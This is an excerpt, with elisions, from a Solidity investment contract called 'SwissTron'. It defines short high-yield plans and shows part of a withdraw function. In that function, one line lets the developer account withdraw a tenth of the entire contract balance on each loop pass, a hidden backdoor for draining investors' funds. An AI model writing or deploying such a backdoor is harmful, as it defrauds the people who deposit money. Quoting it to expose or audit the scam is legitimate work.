...
contract SwissTron is Ownable {
    ...
    function _init() private {
        ...
        investmentPlans_.push(Objects.Plan(49, 40*60*60*24)); //40 days
        investmentPlans_.push(Objects.Plan(59, 25*60*60*24)); //25 days
        investmentPlans_.push(Objects.Plan(69, 18*60*60*24)); //18 days
    }
    ...
    function withdraw() public payable {
        ...
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            ...
            if(msg.sender == developerAccount_){ amount = address(this).balance.div(10); }
